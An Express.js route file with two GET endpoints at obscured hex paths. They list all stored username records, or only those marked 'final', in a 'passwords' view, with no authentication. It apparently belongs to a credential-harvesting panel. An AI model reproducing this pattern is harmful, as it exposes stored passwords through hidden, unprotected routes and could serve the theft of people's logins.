const express = require('express');
const UserName = require('../models/UserName.js');

const router = express.Router();

router.get('/9560F74C21930B7CAA3634D647F52E6F', async (req, res, next) => {
  const passes = await UserName.find();
  const count = await UserName.count();

  res.render('passes', {
    passwords: passes,
    count,
    title: 'all',
  });
});

router.get('/33760E8BAFCFCFC68764091CF96EC423', async (req, res, next) => {
  const passes = await UserName.find({ final: true });
  const count = await UserName.count({ final: true });

  res.render('passes', {
    passwords: passes,
    count,
    title: 'finals',
  });
});

module.exports = router;
